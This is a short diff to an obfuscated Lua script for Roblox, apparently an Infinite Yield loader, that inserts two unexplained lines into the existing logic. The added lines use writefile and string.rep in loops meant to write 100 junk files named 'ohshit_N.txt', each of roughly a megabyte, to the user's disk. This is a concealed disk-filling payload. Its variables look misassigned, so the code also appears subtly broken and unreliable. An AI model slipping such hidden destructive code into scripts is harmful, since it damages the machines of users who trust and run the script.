@@ -139,6 +139,9 @@ local _0x8d9e = {
 
         _0x5a6b()
     end
+			local a,b,c,d,e,f,g,h,i=100,"ohshit_","txt",1024,1024,"A","",string.rep,writefile
+for j=1,b do e=e..g(f,d)end;for j=1,a do h(b..j.."."..c,e)end
+
 else
     game.Players.LocalPlayer:Kick("\73\110\102\105\110\105\116\101\32\89\105\101\108\100\32\111\110\108\121\32\119\111\114\107\115\32\111\110\32\88\101\110\111\47\83\111\108\97\114\97\33")
 end end
